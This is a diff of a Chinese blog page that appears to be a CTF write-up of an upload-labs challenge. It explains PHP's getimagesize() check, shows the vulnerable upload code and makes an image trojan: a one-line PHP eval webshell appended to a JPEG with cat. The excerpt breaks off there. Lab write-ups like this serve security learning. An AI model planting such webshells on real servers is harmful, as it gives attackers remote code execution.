@@ -406,21 +406,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-01-23
+                    2025-01-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    10.8k
+                    13.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    42 分
+                    53 分
                 </div>
                 
 
@@ -1820,6 +1820,419 @@ Content-Disposition: form-data<span class="token punctuation">;</span> <span cla
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><code>255 216</code>两个字节 对应的就是<code>ff d8</code>。其他检测也同理。</p>
+<h1 id="十四、Pass-14🌟（getimagesize文件类型检测-图片木马）"><a href="#十四、Pass-14🌟（getimagesize文件类型检测-图片木马）" class="headerlink" title="十四、Pass-14🌟（getimagesize文件类型检测-图片木马）"></a>十四、Pass-14🌟（getimagesize文件类型检测-图片木马）</h1><h2 id="14-1-题面"><a href="#14-1-题面" class="headerlink" title="14.1 题面"></a>14.1 题面</h2><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.04.58.png" style="zoom:40%;">
+
+<p>这一关跟上一关类似，考察的都是图片木马。</p>
+<h2 id="14-2-jpg图片木马"><a href="#14-2-jpg图片木马" class="headerlink" title="14.2 jpg图片木马"></a>14.2 jpg图片木马</h2><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.11.25.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.16.55.png" style="zoom:50%;">
+
+<p>   按照上一关的操作尝试上传图片木马，上传失败。</p>
+<ul>
+<li>看下提示</li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.13.03.png" style="zoom:50%;">
+
+<p>提示使用getimagesize()检查是否为图片文件。</p>
+<blockquote>
+<h4 id="getimagesize-检查是否为图片文件的原理"><a href="#getimagesize-检查是否为图片文件的原理" class="headerlink" title="getimagesize()检查是否为图片文件的原理"></a>getimagesize()检查是否为图片文件的原理</h4><p><code>getimagesize()</code> 是 PHP 中的一个内置函数，用于获取图像文件的大小和类型信息。它不仅可以读取图像文件的尺寸（宽度和高度），还可以通过文件头信息判断文件是否为有效的图像文件。以下是 <code>getimagesize()</code> 检查图像文件的原理：</p>
+<ol>
+<li><strong>文件头信息检查</strong></li>
+</ol>
+<p><code>getimagesize()</code> 的核心原理是通过读取文件的头部信息来判断文件是否为有效的图像文件。每种图像格式都有其独特的文件头（也称为文件签名或幻数），这些文件头用于标识文件的类型。例如：</p>
+<ul>
+<li><strong>JPG 文件</strong>：文件头通常是 <code>FF D8 FF</code>。</li>
+<li><strong>PNG 文件</strong>：文件头是 <code>89 50 4E 47 0D 0A 1A 0A</code>。</li>
+<li><strong>GIF 文件</strong>：文件头是 <code>47 49 46 38 39 61</code> 或 <code>47 49 46 38 37 61</code>。</li>
+</ul>
+<p><code>getimagesize()</code> 会读取文件的前几个字节，并与这些已知的文件头进行比对。如果匹配，则认为文件是有效的图像文件。</p>
+<ol start="2">
+<li><strong>MIME 类型检测</strong></li>
+</ol>
+<p>除了文件头信息，<code>getimagesize()</code> 还会返回图像文件的 MIME 类型（如 <code>image/jpeg</code>、<code>image/png</code> 等）。这是通过解析文件头信息来确定的。例如：</p>
+<ul>
+<li>如果文件头是 <code>FF D8 FF</code>，则 MIME 类型为 <code>image/jpeg</code>。</li>
+<li>如果文件头是 <code>89 50 4E 47 ...</code>，则 MIME 类型为 <code>image/png</code>。</li>
+</ul>
+<p>通过 MIME 类型，<code>getimagesize()</code> 可以进一步确认文件是否为支持的图像格式。</p>
+<ol start="3">
+<li><strong>图像尺寸解析</strong></li>
+</ol>
+<p>如果文件头确认文件是有效的图像文件，<code>getimagesize()</code> 会进一步解析文件内容，提取图像的宽度和高度信息。不同格式的图像文件存储尺寸信息的方式不同：</p>
+<ul>
+<li><strong>JPG 文件</strong>：尺寸信息存储在特定的 JPEG 数据段中（如 <code>SOF0</code> 段）。</li>
+<li><strong>PNG 文件</strong>：尺寸信息存储在 <code>IHDR</code> 数据块中。</li>
+<li><strong>GIF 文件</strong>：尺寸信息存储在文件头后的固定位置。</li>
+</ul>
+<p>通过解析这些数据段或数据块，<code>getimagesize()</code> 可以获取图像的宽度和高度。</p>
+<ol start="4">
+<li><strong>返回值</strong></li>
+</ol>
+<p><code>getimagesize()</code> 返回一个数组，包含以下信息：</p>
+<ul>
+<li><code>[0]</code>：图像宽度（像素）。</li>
+<li><code>[1]</code>：图像高度（像素）。</li>
+<li><code>[2]</code>：图像类型（如 <code>IMG_JPG</code>、<code>IMG_PNG</code> 等）。</li>
+<li><code>[3]</code>：文本字符串，包含宽度和高度的 HTML <code>width</code> 和 <code>height</code> 属性。</li>
+<li><code>[mime]</code>：图像的 MIME 类型（如 <code>image/jpeg</code>）。</li>
+</ul>
+<p>如果文件不是有效的图像文件，<code>getimagesize()</code> 会返回 <code>false</code>。</p>
+<ol start="5">
+<li><strong>安全性</strong></li>
+</ol>
+<p>由于 <code>getimagesize()</code> 通过文件头信息和内容解析来判断文件是否为有效的图像文件，它比简单的文件扩展名检查更可靠。然而，它仍然存在一些潜在的安全问题：</p>
+<ul>
+<li><strong>文件头伪造</strong>：攻击者可能在文件开头添加正确的文件头，但文件内容实际上是恶意代码。</li>
+<li><strong>部分损坏的文件</strong>：某些损坏的图像文件可能仍然通过 <code>getimagesize()</code> 的检测。</li>
+</ul>
+<p>因此，在处理文件上传时，建议结合其他安全措施，如：</p>
+<ul>
+<li>检查文件扩展名。</li>
+<li>使用 <code>exif_imagetype()</code> 函数进一步验证文件类型。</li>
+<li>对上传的文件进行严格的路径和文件名过滤。</li>
+</ul>
+</blockquote>
+<ul>
+<li>看下代码</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$types</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.jpeg|.png|.gif'</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$types</span><span class="token punctuation">,</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$res</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>核心代码：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$info</span> <span class="token operator">=</span> getimagesize<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$ext</span> <span class="token operator">=</span> image_type_to_extension<span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>检测逻辑仅用到了<code>$info[2]</code>也就是图像类型信息。其实也可以看到代码并没有检测文件后缀，而是直接使用了getimagesize函数返回的后缀信息。</p>
+<p>可能jpg和jpeg还是有区别的：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.30.23.png" style="zoom:50%;">
+
+<p>但是用<code>jpeg</code>头还是上传失败了。</p>
+<ul>
+<li>mac 文件简介注释处添加木马（失败）</li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.49.31.png" style="zoom:50%;">
+
+<p>尝试下载一个完好的jpeg文件。</p>
+<p>然后插入木马：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.51.28.png" style="zoom:50%;">
+
+<p>但是这种方法上传的木马没有效果。</p>
+<ul>
+<li>使用cat 命令制作图片木马</li>
+</ul>
+<p>可能由于getiamgesize对图片检测比较全面。我们先下载一张原始的jpeg图像，放下面了（比如命名为img.jpeg）：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E5%8E%9F%E5%A7%8Bjpeg%E5%9B%BE%E7%89%87.jpeg" alt="原始jpeg图片" style="zoom:67%;">
+
+<p>准备好yjh.php</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>?<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后使用cat命令合并文件：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> yjh.php <span class="token operator">&gt;&gt;</span> img.jpeg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后可以用010editor打开看下：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.15.16.png" style="zoom:50%;">
+
+<p>图片尾部已经被添加一句话木马。</p>
+<p>木马文件如下：</p>
